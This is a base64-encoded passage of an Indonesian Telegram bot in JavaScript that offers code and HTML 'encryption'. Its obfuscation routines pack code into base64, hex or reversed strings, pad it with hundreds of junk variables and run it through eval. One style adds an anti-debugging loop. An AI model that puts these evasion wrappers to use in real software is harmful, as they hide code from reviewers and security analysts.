IEdhZ2FsOiAke2Vyci5tZXNzYWdlfWApOwogICAgfQp9Cgpib3Quc3RhcnQoYXN5bmMgKGN0eCkgPT4gewogICAgY29uc3QgdXNlcklkID0gU3RyaW5nKGN0eC5mcm9tLmlkKTsKCiAgICAvLyBTaW1wYW4gdXNlciBiYXJ1IG90b21hdGlzCiAgICBpZiAoIWlzVXNlckhhc0FjY2Vzcyh1c2VySWQpKSB7CiAgICAgICAgc2V0VXNlckFjY2Vzcyh1c2VySWQsIHRydWUpOwoKICAgICAgICBjb25zb2xlLmxvZygKICAgICAgICAgICAgYFtORVcgVVNFUl0gJHtjdHguZnJvbS5maXJzdF9uYW1lIHx8ICdObyBOYW1lJ30gKCR7dXNlcklkfSlgCiAgICAgICAgKTsKICAgIH0KCiAgICAvLyBSZWFjdGlvbiBrZSBwZXNhbiAvc3RhcnQKICAgIHRyeSB7CiAgICAgICAgYXdhaXQgY3R4LnRlbGVncmFtLnNldE1lc3NhZ2VSZWFjdGlvbigKICAgICAgICAgICAgY3R4LmNoYXQuaWQsCiAgICAgICAgICAgIGN0eC5tZXNzYWdlLm1lc3NhZ2VfaWQsCiAgICAgICAgICAgIFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnZW1vamknLAogICAgICAgICAgICAgICAgICAgIGVtb2ppOiAn8J+RvicKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXQogICAgICAgICk7CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICBjb25zb2xlLmxvZygnR2FnYWwgbWVtYmVyaSByZWFjdGlvbjonLCBlcnIubWVzc2FnZSk7CiAgICB9CgogICAgcmV0dXJuIHNob3dNZW51MShjdHgpOwp9KTsKCi8vID09PT09PT09PT09PT09PT09PT09IFRBTVBJTEFOIE1FTlUgPT09PT09PT09PT09PT09PT09PT0KYXN5bmMgZnVuY3Rpb24gc2hvd01lbnUxKGN0eCwgbWVzc2FnZUlkID0gbnVsbCkgewogICAgY29uc3QgY2FwdGlvbiA9IGBcYFxgXGBqcwrilZTilZDilZDilZDilZDilZDilZDinK7inYHigKLCsOKZm8Kw4oCi4p2B4pyuIOKVkOKVkOKVkOKVkOKVkOKVlwogICAg8J2QlvCdkJ7wnZCl8J2QnPCdkKjwnZCm8J2QniDwnZCT8J2QqCAgIOKUgCAg8J2QlPCdkKzwnZCe8J2Qq/CdkKwgCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKcruKdgeKAosKw4p2AwrDigKLinYHinK7ilZDilZDilZDilZDilZDilZDilZ0KClN5c3RlbSA6IEZyZWUgQWNjZXNzIEFjdGl2YXRlZApZb3VyIFVzbiA6ICR7Y3R4LmZyb20udXNlcm5hbWV9CllvdXIgSWQgOiAke2N0eC5mcm9tLmlkfQpGZWF0dXIgOiBFbmNyeXB0IEZvciBGaWxlLFRvb2xzLGV0YwrilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEKCu+0v9il2ZDZhtmR2Y4g2KfZhNmE2ZHZjtmH2Y4g2YfZj9mI2Y4g2KfZhNix2ZHZjtiy2ZHZjtin2YLZjyDYsNmP2Ygg2KfZhNmS2YLZj9mI2ZHZjtip2ZAg2KfZhNmS2YXZjtiq2ZDZitmG2Y/vtL4g254g2KfZhNiw2KfYsdmK2KfYqiAvINml2agKClNlc3VuZ2d1aG55YSBBbGxhaCBsYWggUGVtYmVyaSByZXpraSwgRGlhbGFoIHlhbmcgbWVtcHVueWFpIGtla3VhdGFuIHlhbmcga29rb2guCgrYrtiv2KfZiNmG2K8g2K7ZiNivINix2YjYstmJ2LHYs9in2YYg2YbZitix2YjZhdmG2K8g2KfYs9iq2YjYp9ixINin2LPYqi5cYFxgXGAKYDsKICAgIGNvbnN0IHRodW1iID0gYXdhaXQgZ2V0VGh1bWJuYWlsQnVmZmVyKCk7CiAgICBpZiAobWVzc2FnZUlkKSB7CiAgICAgICAgLy8gRWRpdCBwZXNhbiB5YW5nIHN1ZGFoIGFkYQogICAgICAgIGlmICh0aHVtYikgewogICAgICAgICAgICBhd2FpdCBjdHgudGVsZWdyYW0uZWRpdE1lc3NhZ2VNZWRpYShjdHguY2hhdC5pZCwgbWVzc2FnZUlkLCB1bmRlZmluZWQsIHsKICAgICAgICAgICAgICAgIHR5cGU6ICdwaG90bycsCiAgICAgICAgICAgICAgICBtZWRpYTogeyBzb3VyY2U6IHRodW1iIH0sCiAgICAgICAgICAgICAgICBjYXB0aW9uLAogICAgICAgICAgICAgICAgcGFyc2VfbW9kZTogJ01hcmtkb3duJwogICAgICAgICAgICB9LCB7IHJlcGx5X21hcmt1cDogb3Blbk1lbnVLZXlib2FyZCB9KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBhd2FpdCBjdHgudGVsZWdyYW0uZWRpdE1lc3NhZ2VUZXh0KGN0eC5jaGF0LmlkLCBtZXNzYWdlSWQsIHVuZGVmaW5lZCwgY2FwdGlvbiwgewogICAgICAgICAgICAgICAgcGFyc2VfbW9kZTogJ01hcmtkb3duJywKICAgICAgICAgICAgICAgIHJlcGx5X21hcmt1cDogb3Blbk1lbnVLZXlib2FyZAogICAgICAgICAgICB9KTsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIC8vIEtpcmltIHBlc2FuIGJhcnUKICAgICAgICBpZiAodGh1bWIpIHsKICAgICAgICAgICAgYXdhaXQgY3R4LnJlcGx5V2l0aFBob3RvKHsgc291cmNlOiB0aHVtYiB9LCB7IGNhcHRpb24sIHBhcnNlX21vZGU6ICdNYXJrZG93bicsIHJlcGx5X21hcmt1cDogb3Blbk1lbnVLZXlib2FyZCB9KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBhd2FpdCBjdHgucmVwbHkoY2FwdGlvbiwgeyBwYXJzZV9tb2RlOiAnTWFya2Rvd24nLCByZXBseV9tYXJrdXA6IG9wZW5NZW51S2V5Ym9hcmQgfSk7CiAgICAgICAgfQogICAgfQp9Cgphc3luYyBmdW5jdGlvbiBzaG93TWVudTIoY3R4LCBtZXNzYWdlSWQgPSBudWxsKSB7CiAgICBjb25zdCBjYXB0aW9uID0gYFxgXGBcYGpzCuKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkCDgs4vhg6Yg8J2Ws/Cdl4jwnZeI8J2XhfCdl4wg8J2WrPCdlr7wnZeH8J2XjiDhg6bgs4sg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCuKVoCDilqIgL2Nla2NvZGUg8J2WovCdl4HwnZa+8J2WvPCdl4QgY29kZQrilaAg4paiIC9jZWtlcnJvciDwnZai8J2XgfCdlr7wnZa88J2XhCDwnZa+8J2Xi/Cdl4vwnZeI8J2XiyDwnZa/8J2XiPCdl4sg8J2Wv/Cdl4LwnZeF8J2WvgrilaAg4paiIC9pbmZvZXJyb3Ig8J2WqPCdl4fwnZa/8J2XiCDwnZa+8J2Xi/Cdl4vwnZeI8J2XiyArIPCdlrrwnZeO8J2XjfCdl4gg8J2Wv/Cdl4LwnZa8CuKVoCDilqIgL2Nla2VpZGVtb2ppIPCdlqLwnZeB8J2WvvCdlrzwnZeEIPCdl4LwnZa9IPCdlr7wnZeG8J2XiPCdl4PwnZeCIPCdl4nwnZeL8J2WvvCdl4YK4pWgIOKWoiAvZml4ZXJyb3Ig8J2WpfCdl4LwnZeR8J2WvvCdlr0g8J2WvvCdl4vwnZeL8J2XiPCdl4sK4pWgIOKWoiAvY2xlYW5jb2RlIPCdlqLwnZeF8J2WvvCdlrrwnZeHIPCdlqLwnZeI8J2WvfCdlr4K4pWgIOKWoiAvYWkg8J2WovCdl4HwnZa68J2XjSDwnZag8J2XggrilaAg4paiIC9nZXRzb3VyY2UgR2V0IFNvdXJjZSBIdG1sCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkCDgs4vhg6Yg4pWQ4pWQIPCfjLgg4pWQ4pWQ4YOm4LOLIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnVxgXGBcYApgOwogICAgY29uc3QgdGh1bWIgPSBhd2FpdCBnZXRUaHVtYm5haWxCdWZmZXIoKTsKICAgIGlmIChtZXNzYWdlSWQpIHsKICAgICAgICBpZiAodGh1bWIpIHsKICAgICAgICAgICAgYXdhaXQgY3R4LnRlbGVncmFtLmVkaXRNZXNzYWdlTWVkaWEoY3R4LmNoYXQuaWQsIG1lc3NhZ2VJZCwgdW5kZWZpbmVkLCB7CiAgICAgICAgICAgICAgICB0eXBlOiAncGhvdG8nLAogICAgICAgICAgICAgICAgbWVkaWE6IHsgc291cmNlOiB0aHVtYiB9LAogICAgICAgICAgICAgICAgY2FwdGlvbiwKICAgICAgICAgICAgICAgIHBhcnNlX21vZGU6ICdNYXJrZG93bicKICAgICAgICAgICAgfSwgeyByZXBseV9tYXJrdXA6IFRvb2xzS2V5Ym9hcmQgfSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgYXdhaXQgY3R4LnRlbGVncmFtLmVkaXRNZXNzYWdlVGV4dChjdHguY2hhdC5pZCwgbWVzc2FnZUlkLCB1bmRlZmluZWQsIGNhcHRpb24sIHsKICAgICAgICAgICAgICAgIHBhcnNlX21vZGU6ICdNYXJrZG93bicsCiAgICAgICAgICAgICAgICByZXBseV9tYXJrdXA6IFRvb2xzS2V5Ym9hcmQKICAgICAgICAgICAgfSk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBpZiAodGh1bWIpIHsKICAgICAgICAgICAgYXdhaXQgY3R4LnJlcGx5V2l0aFBob3RvKHsgc291cmNlOiB0aHVtYiB9LCB7IGNhcHRpb24sIHBhcnNlX21vZGU6ICdNYXJrZG93bicsIHJlcGx5X21hcmt1cDogVG9vbHNLZXlib2FyZCB9KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBhd2FpdCBjdHgucmVwbHkoY2FwdGlvbiwgeyBwYXJzZV9tb2RlOiAnTWFya2Rvd24nLCByZXBseV9tYXJrdXA6IFRvb2xzS2V5Ym9hcmQgfSk7CiAgICAgICAgfQogICAgfQp9Cgphc3luYyBmdW5jdGlvbiBFbmNWMShjdHgsIG1lc3NhZ2VJZCA9IG51bGwpIHsKICAgIGNvbnN0IGNhcHRpb24gPSBgXGBcYFxganMK4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIOCzi+GDpiDwnZak8J2Xh/CdlrzwnZeL8J2XkvCdl4nwnZeNIPCdlqzwnZa+8J2Xh/Cdl44g8J2WtfCdn6Mg4YOm4LOLIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwrilaAg4paiIC9hcnRpbGxlcnkgTGlnaHQgJiBTZWN1cmUg8J2XifCdl4vwnZeI8J2XjfCdlr7wnZa88J2XjfCdl4LwnZeI8J2XhwrilaAg4paiIC9oYXJkY29kZSBNYXggUHJvdGVjdGlvbiBtb2RlCuKVoCDilqIgL3BoYW50b20gSW52aXNpYmxlICYgU3Ryb25nIGNvZGUK4pWgIOKWoiAvYmFsYW5jZWQgU21hcnQgJiBTdGFibGUgZGVmZW5zZQrilaAg4paiIC9yZXZlcnNlZCBSZW5hbWUgJiBTaGllbGQgc3lzdGVtCuKVoCDilqIgL3Jvc2VtYXJ5IPCdlrTwnZeF8J2XjfCdl4vwnZa6IPCdlqPwnZa+8J2Wv/Cdlr7wnZeH8J2XjPCdlr4g8J2XhvCdl4jwnZa98J2WvgrilaAg4paiIC9lbmN0aW1lIPCdn6XwnZ+iICjwnZ+l8J2foiDwnZeB8J2WuvCdl4vwnZeCKQrilaAg4paiIC9oYXJkaHRtbCBFbmNyeXB0IEhhcmQgSHRtbArilZrilZDilZDilZDilZDilZDilZDilZAg4LOL4YOmIOKVkOKVkOKVkCAg8J+MuCAg4pWQ4pWQ4pWQIOGDpuCziyDilZDilZDilZDilZDilZDilZDilZDilZ1cYFxgXGAKYDsKICAgIGNvbnN0IHRodW1iID0gYXdhaXQgZ2V0VGh1bWJuYWlsQnVmZmVyKCk7CiAgICBpZiAobWVzc2FnZUlkKSB7CiAgICAgICAgaWYgKHRodW1iKSB7CiAgICAgICAgICAgIGF3YWl0IGN0eC50ZWxlZ3JhbS5lZGl0TWVzc2FnZU1lZGlhKGN0eC5jaGF0LmlkLCBtZXNzYWdlSWQsIHVuZGVmaW5lZCwgewogICAgICAgICAgICAgICAgdHlwZTogJ3Bob3RvJywKICAgICAgICAgICAgICAgIG1lZGlhOiB7IHNvdXJjZTogdGh1bWIgfSwKICAgICAgICAgICAgICAgIGNhcHRpb24sCiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlOiAnTWFya2Rvd24nCiAgICAgICAgICAgIH0sIHsgcmVwbHlfbWFya3VwOiBFbmNWMUtleWJvYXJkIH0pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGF3YWl0IGN0eC50ZWxlZ3JhbS5lZGl0TWVzc2FnZVRleHQoY3R4LmNoYXQuaWQsIG1lc3NhZ2VJZCwgdW5kZWZpbmVkLCBjYXB0aW9uLCB7CiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlOiAnTWFya2Rvd24nLAogICAgICAgICAgICAgICAgcmVwbHlfbWFya3VwOiBFbmNWMUtleWJvYXJkCiAgICAgICAgICAgIH0pOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgaWYgKHRodW1iKSB7CiAgICAgICAgICAgIGF3YWl0IGN0eC5yZXBseVdpdGhQaG90byh7IHNvdXJjZTogdGh1bWIgfSwgeyBjYXB0aW9uLCBwYXJzZV9tb2RlOiAnTWFya2Rvd24nLCByZXBseV9tYXJrdXA6IEVuY1YxS2V5Ym9hcmQgfSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgYXdhaXQgY3R4LnJlcGx5KGNhcHRpb24sIHsgcGFyc2VfbW9kZTogJ01hcmtkb3duJywgcmVwbHlfbWFya3VwOiBFbmNWMUtleWJvYXJkIH0pOwogICAgICAgIH0KICAgIH0KfQoKYXN5bmMgZnVuY3Rpb24gRW5jVjIoY3R4LCBtZXNzYWdlSWQgPSBudWxsKSB7CiAgICBjb25zdCBjYXB0aW9uID0gYFxgXGBcYGpzCuKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkCDgs4vhg6Yg8J2WpPCdl4fwnZa88J2Xi/Cdl5LwnZeJ8J2XjSDwnZas8J2WvvCdl4fwnZeOIPCdlrXwnZ+kIOGDpuCziyDilZDilZDilZDilZDilZDilZDilZDilZcK4pWgIOKWoiAvZW5jY3VzdG9tIPCdlqLwnZeO8J2XjPCdl43wnZeI8J2XhiDwnZat8J2WuvCdl4bwnZa+CuKVoCDilqIgL2ludmlzZW5jIPCdlqjwnZeH8J2Xj/Cdl4LwnZeM8J2Wu/Cdl4XwnZa+IPCdlqfwnZa68J2Xi/Cdlr0K4pWgIOKWoiAvamFwYW5lbmMg8J2WqfCdlrrwnZeJ8J2WuvCdl4fwnZa+8J2XjPCdlr4g8J2WsvCdl43wnZeS8J2XhfCdlr4K4pWgIOKWoiAvZW5jYXJhYiDwnZag8J2Xi/CdlrrwnZa7IPCdlrLwnZeN8J2XkvCdl4XwnZa+CuKVoCDilqIgL3NpdWVuYyDwnZay8J2XgvCdl44g8J2WsvCdl43wnZeS8J2XhfCdlr4K4pWgIOKWoiAvamFwYW4g8J2WqfCdlrrwnZeJ8J2WuvCdl4cg8J2WsvCdl43wnZeS8J2XhfCdlr4K4pWgIOKWoiAvbmVidWxhIPCdlq3wnZa+8J2Wu/Cdl47wnZeF8J2WuiDwnZay8J2XjfCdl5LwnZeF8J2WvgrilaAg4paiIC92YXIg8J2WtfCdlrrwnZeLIPCdlrLwnZeN8J2XkvCdl4XwnZa+CuKVoCDilqIgL2ludmlzaHRtbCBFbmNyeXB0IEhtdGwK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIOCzi+GDpiDilZDilZDilZAgIPCfjLggIOKVkOKVkOKVkCDhg6bgs4sg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdXGBcYFxgCmA7CiAgICBjb25zdCB0aHVtYiA9IGF3YWl0IGdldFRodW1ibmFpbEJ1ZmZlcigpOwogICAgaWYgKG1lc3NhZ2VJZCkgewogICAgICAgIGlmICh0aHVtYikgewogICAgICAgICAgICBhd2FpdCBjdHgudGVsZWdyYW0uZWRpdE1lc3NhZ2VNZWRpYShjdHguY2hhdC5pZCwgbWVzc2FnZUlkLCB1bmRlZmluZWQsIHsKICAgICAgICAgICAgICAgIHR5cGU6ICdwaG90bycsCiAgICAgICAgICAgICAgICBtZWRpYTogeyBzb3VyY2U6IHRodW1iIH0sCiAgICAgICAgICAgICAgICBjYXB0aW9uLAogICAgICAgICAgICAgICAgcGFyc2VfbW9kZTogJ01hcmtkb3duJwogICAgICAgICAgICB9LCB7IHJlcGx5X21hcmt1cDogRW5jVjJLZXlib2FyZCB9KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBhd2FpdCBjdHgudGVsZWdyYW0uZWRpdE1lc3NhZ2VUZXh0KGN0eC5jaGF0LmlkLCBtZXNzYWdlSWQsIHVuZGVmaW5lZCwgY2FwdGlvbiwgewogICAgICAgICAgICAgICAgcGFyc2VfbW9kZTogJ01hcmtkb3duJywKICAgICAgICAgICAgICAgIHJlcGx5X21hcmt1cDogRW5jVjJLZXlib2FyZAogICAgICAgICAgICB9KTsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIGlmICh0aHVtYikgewogICAgICAgICAgICBhd2FpdCBjdHgucmVwbHlXaXRoUGhvdG8oeyBzb3VyY2U6IHRodW1iIH0sIHsgY2FwdGlvbiwgcGFyc2VfbW9kZTogJ01hcmtkb3duJywgcmVwbHlfbWFya3VwOiBFbmNWMktleWJvYXJkIH0pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGF3YWl0IGN0eC5yZXBseShjYXB0aW9uLCB7IHBhcnNlX21vZGU6ICdNYXJrZG93bicsIHJlcGx5X21hcmt1cDogRW5jVjJLZXlib2FyZCB9KTsKICAgICAgICB9CiAgICB9Cn0KCi8vID09PT09PT09PT09PT09PT09PT09IENBTExCQUNLID09PT09PT09PT09PT09PT09PT09CmJvdC5hY3Rpb24oJ29wZW5fbWVudScsIGFzeW5jIChjdHgpID0+IHsKICAgIGNvbnN0IG1lc3NhZ2VJZCA9IGN0eC5jYWxsYmFja1F1ZXJ5Lm1lc3NhZ2UubWVzc2FnZV9pZDsKICAgIGF3YWl0IHNob3dNZW51MShjdHgsIG1lc3NhZ2VJZCk7CiAgICBhd2FpdCBjdHguYW5zd2VyQ2JRdWVyeSgpOwp9KTsKCmJvdC5hY3Rpb24oJ21haW5fbWVudScsIGFzeW5jIChjdHgpID0+IHsKICAgIGNvbnN0IG1lc3NhZ2VJZCA9IGN0eC5jYWxsYmFja1F1ZXJ5Lm1lc3NhZ2UubWVzc2FnZV9pZDsKICAgIGF3YWl0IHNob3dNZW51MShjdHgsIG1lc3NhZ2VJZCk7CiAgICBhd2FpdCBjdHguYW5zd2VyQ2JRdWVyeSgpOwp9KTsKCmJvdC5hY3Rpb24oJ2VuY19tZW51X3YxJywgYXN5bmMgKGN0eCkgPT4gewogICAgY29uc3QgbWVzc2FnZUlkID0gY3R4LmNhbGxiYWNrUXVlcnkubWVzc2FnZS5tZXNzYWdlX2lkOwogICAgYXdhaXQgRW5jVjEoY3R4LCBtZXNzYWdlSWQpOwogICAgYXdhaXQgY3R4LmFuc3dlckNiUXVlcnkoKTsKfSk7Cgpib3QuYWN0aW9uKCdlbmNfbWVudV92MicsIGFzeW5jIChjdHgpID0+IHsKICAgIGNvbnN0IG1lc3NhZ2VJZCA9IGN0eC5jYWxsYmFja1F1ZXJ5Lm1lc3NhZ2UubWVzc2FnZV9pZDsKICAgIGF3YWl0IEVuY1YyKGN0eCwgbWVzc2FnZUlkKTsKICAgIGF3YWl0IGN0eC5hbnN3ZXJDYlF1ZXJ5KCk7Cn0pOwoKYm90LmFjdGlvbigndG9vbHNfbWVudScsIGFzeW5jIChjdHgpID0+IHsKICAgIGNvbnN0IG1lc3NhZ2VJZCA9IGN0eC5jYWxsYmFja1F1ZXJ5Lm1lc3NhZ2UubWVzc2FnZV9pZDsKICAgIGF3YWl0IHNob3dNZW51MihjdHgsIG1lc3NhZ2VJZCk7CiAgICBhd2FpdCBjdHguYW5zd2VyQ2JRdWVyeSgpOwp9KTsKCmJvdC5hY3Rpb24oIm93bmVyX21lbnUiLCBhc3luYyAoY3R4KSA9PiB7CgogIC8vIGhhbnlhIG93bmVyCiAgaWYgKE51bWJlcihjdHguZnJvbS5pZCkgIT09IGNvbmZpZy5PV05FUl9JRCkgewoKICAgIHJldHVybiBjdHguYW5zd2VyQ2JRdWVyeSgKICAgICAgIuKcmCDwnZat8J2XiCDwnZat8J2XiCDwnZa48J2WuvCdl4QuIiwKICAgICAgewogICAgICAgIHNob3dfYWxlcnQ6IHRydWUKICAgICAgfQogICAgKQogIH0KCiAgYXdhaXQgY3R4LmFuc3dlckNiUXVlcnkoKQoKICBjb25zdCBjYXAgPQpgXGBcYFxganMK8J2WrPCdlr7wnZeH8J2XjiDwnZaq8J2XgfCdl47wnZeM8J2XjvCdl4wg8J2WrvCdl5DwnZeH8J2WvvCdl4sK4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACigg4pyYICnwnZas8J2WvvCdl4fwnZeOIPCdlqrwnZeB8J2XjvCdl4zwnZeO8J2XjCDwnZau8J2XkPCdl4fwnZa+8J2XiwoKL2Jyb2FkY2FzdCDigJMgUmVwbHkgVGV4dAovbWFpbnRlbmFuY2Ug4oCTIG9uL29mZnxhbGFzYW48CuKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAoK8J2WoPCdlrzwnZa88J2WvvCdl4zwnZeMIPCdlq7wnZeH8J2XhfCdl5Ig8J2WrvCdl5DwnZeH8J2WvvCdl4sg8J2WqPCdlr1cYFxgXGAKYAoKICB0cnkgewoKICAgIGF3YWl0IGN0eC5lZGl0TWVzc2FnZUNhcHRpb24oCiAgICAgIGNhcCwKICAgICAgewogICAgICAgIHBhcnNlX21vZGU6ICJNYXJrZG93biIsCiAgICAgICAgcmVwbHlfbWFya3VwOiBPd25LYgogICAgICB9CiAgICApCgogIH0gY2F0Y2ggewoKICAgIHRyeSB7CgogICAgICBhd2FpdCBjdHguZWRpdE1lc3NhZ2VUZXh0KAogICAgICAgIGNhcCwKICAgICAgICB7CiAgICAgICAgICBwYXJzZV9tb2RlOiAiTWFya2Rvd24iLAogICAgICAgICAgcmVwbHlfbWFya3VwOiBPd25LYgogICAgICAgIH0KICAgICAgKQoKICAgIH0gY2F0Y2gge30KICB9Cn0pOwovLyA9PT09PT09PT09PT09PT09PT09PSBSQU5ET00gPT09PT09PT09PT09PT09PT09PT0KCmZ1bmN0aW9uIHJhbmRvbUhleChsZW5ndGggPSA0MCkgewpyZXR1cm4gY3J5cHRvCi5yYW5kb21CeXRlcyhsZW5ndGgpCi50b1N0cmluZygiaGV4IikKfQoKZnVuY3Rpb24gcmFuZG9tTmFtZShsaXN0KSB7Cgpjb25zdCBleHRyYSA9IFsKIuODhCIsIuOAhSIsIuOAhiIsIuODoSIsIuOCkyIsIuC4rCIsIuWIgyIsIuC4rCIKXQoKcmV0dXJuICgKbGlzdFsKTWF0aC5mbG9vcigKTWF0aC5yYW5kb20oKSAqCmxpc3QubGVuZ3RoCikKXSArCmV4dHJhWwpNYXRoLmZsb29yKApNYXRoLnJhbmRvbSgpICoKZXh0cmEubGVuZ3RoCikKXSArCk1hdGguZmxvb3IoCk1hdGgucmFuZG9tKCkgKiA5OTk5OQopCikKCn0KCi8vID09PT09PT09PT09PT09PT09PT09IEdMT0JBTCBDSEFPUyA9PT09PT09PT09PT09PT09PT09PQoKZnVuY3Rpb24gY2hhb3NWYXJzKHRvdGFsPTUwMCxuYW1lcz1bXSl7CgpsZXQgb3V0ID0gYGAKCmZvcihsZXQgaT0wO2k8dG90YWw7aSsrKXsKCm91dCArPSBgCnZhciAke3JhbmRvbU5hbWUobmFtZXMpfT0iJHtyYW5kb21IZXgoODApfSI7CmAKCn0KCnJldHVybiBvdXQKCn0KCi8vID09PT09PT09PT09PT09PT09PT09IEFSVElMTEVSWSA9PT09PT09PT09PT09PT09PT09PQoKZnVuY3Rpb24gYXJ0aWxsZXJ5U3R5bGUoY29kZSl7Cgpjb25zdCBhcnQgPSBbCiLjgaTjgY0iLCLjgZXjgY/jgokiLCLjgbvjgZciLCLjgobjgY0iLAoi44Gt44GTIiwi44G/44GaIiwi44GL44GcIiwi44KE44G/IgpdCgpjb25zdCBiNjQgPQpCdWZmZXIKLmZyb20oY29kZSkKLnRvU3RyaW5nKCJiYXNlNjQiKQoKcmV0dXJuIGAKKGZ1bmN0aW9uKCl7CiR7Y2hhb3NWYXJzKDYwMCxhcnQpfQpmdW5jdGlvbiAke3JhbmRvbU5hbWUoYXJ0KX0oKXsKY29uc3QgJHtyYW5kb21OYW1lKGFydCl9PSIke2I2NH0iOwpyZXR1cm4gQnVmZmVyCi5mcm9tKAoke3JhbmRvbU5hbWUoYXJ0KX0sCiJiYXNlNjQiCikKLnRvU3RyaW5nKCkKfQpldmFsKAoke3JhbmRvbU5hbWUoYXJ0KX0oKQopCn0pKCk7CmAKCn0KCi8vID09PT09PT09PT09PT09PT09PT09IEhBUkRDT1JFID09PT09PT09PT09PT09PT09PT09CgpmdW5jdGlvbiBoYXJkY29yZVN0eWxlKGNvZGUpewoKY29uc3QgaGFyZCA9IFsKIuaCqumtlCIsIumXhyIsIueEoemZkCIsIuW0qeWjiiIsCiLpm7YiLCLmrbvnpZ4iLCLlubsiLCLmu4UiCl0KCmNvbnN0IGI2NCA9CkJ1ZmZlcgouZnJvbShjb2RlKQoudG9TdHJpbmcoImJhc2U2NCIpCgpyZXR1cm4gYAooZnVuY3Rpb24oKXsKJHtjaGFvc1ZhcnMoMTAwMCxoYXJkKX0Kc2V0SW50ZXJ2YWwoKCk9PnsKZGVidWdnZXIKfSwxKQpjb25zb2xlLmNsZWFyKCkKZnVuY3Rpb24gJHtyYW5kb21OYW1lKGhhcmQpfSgpewpjb25zdCAke3JhbmRvbU5hbWUoaGFyZCl9PSIke2I2NH0iCnJldHVybiBCdWZmZXIKLmZyb20oCiR7cmFuZG9tTmFtZShoYXJkKX0sCiJiYXNlNjQiCikKLnRvU3RyaW5nKCkKfQpldmFsKAoke3JhbmRvbU5hbWUoaGFyZCl9KCkKKQp9KSgpOwpgCgp9CgovLyA9PT09PT09PT09PT09PT09PT09PSBQSEFOVE9NID09PT09PT09PT09PT09PT09PT09CgpmdW5jdGlvbiBwaGFudG9tU3R5bGUoY29kZSl7Cgpjb25zdCBuYW1lcyA9IFsKIuW5uyIsIuW5vemciiIsIuS6oemciiIsIuW9sSIKXQoKY29uc3QgaGV4ID0KQnVmZmVyCi5mcm9tKGNvZGUpCi50b1N0cmluZygiaGV4IikKCnJldHVybiBgCihmdW5jdGlvbigpewoke2NoYW9zVmFycyg0MDAsbmFtZXMpfQpmdW5jdGlvbiAke3JhbmRvbU5hbWUobmFtZXMpfSgpewpyZXR1cm4gQnVmZmVyCi5mcm9tKAoiJHtoZXh9IiwKImhleCIKKQoudG9TdHJpbmcoKQp9CmV2YWwoCiR7cmFuZG9tTmFtZShuYW1lcyl9KCkKKQp9KSgpOwpgCgp9CgovLyA9PT09PT09PT09PT09PT09PT09PSBCQUxBTkNFRCA9PT09PT09PT09PT09PT09PT09PQoKZnVuY3Rpb24gYmFsYW5jZWRTdHlsZShjb2RlKXsKCmNvbnN0IG5hbWVzID0gWwoi5Z2H6KGhIiwi6Z2ZIiwi6aKoIiwi5pyIIgpdCgpjb25zdCBiNjQgPQpCdWZmZXIKLmZyb20oY29kZSkKLnRvU3RyaW5nKCJiYXNlNjQiKQoKcmV0dXJuIGAKKGZ1bmN0aW9uKCl7CiR7Y2hhb3NWYXJzKDMwMCxuYW1lcyl9CmNvbnN0ICR7cmFuZG9tTmFtZShuYW1lcyl9PSIke2I2NH0iCmV2YWwoCkJ1ZmZlcgouZnJvbSgKJHtyYW5kb21OYW1lKG5hbWVzKX0sCiJiYXNlNjQiCikKLnRvU3RyaW5nKCkKKQp9KSgpOwpgCgp9CgovLyA9PT09PT09PT09PT09PT09PT09PSBSRVZFUlNFRCA9PT09PT09PT09PT09PT09PT09PQoKZnVuY3Rpb24gcmV2ZXJzZWRTdHlsZShjb2RlKXsKCmNvbnN0IG5hbWVzID0gWwoi6YCGIiwi5Y+N6LuiIiwi5oi7Iiwi57WCIgpdCgpjb25zdCByZXYgPQpjb2RlCi5zcGxpdCgiIikKLnJldmVyc2UoKQouam9pbigiIikKCnJldHVybiBgCihmdW5jdGlvbigpewoke2NoYW9zVmFycygzNTAsbmFtZXMpfQpmdW5jdGlvbiAke3JhbmRvbU5hbWUobmFtZXMpfSgpewpyZXR1cm4gIiR7cmV2fSIKLnNwbGl0KCIiKQoucmV2ZXJzZSgpCi5qb2luKCIiKQp9CmV2YWwoCiR7cmFuZG9tTmFtZShuYW1lcyl9KCkKKQp9KSgpOwpgCgp9CgovLyA9PT09PT09PT09PT09PT09PT09PSBST1NFTUFSWSA9PT09PT09PT09PT09PT09PT09PQoKZnVuY3Rpb24gcm9zZW1hcnlTdHlsZShjb2RlKXsKCmNvbnN0IG5hbWVzID0gWwo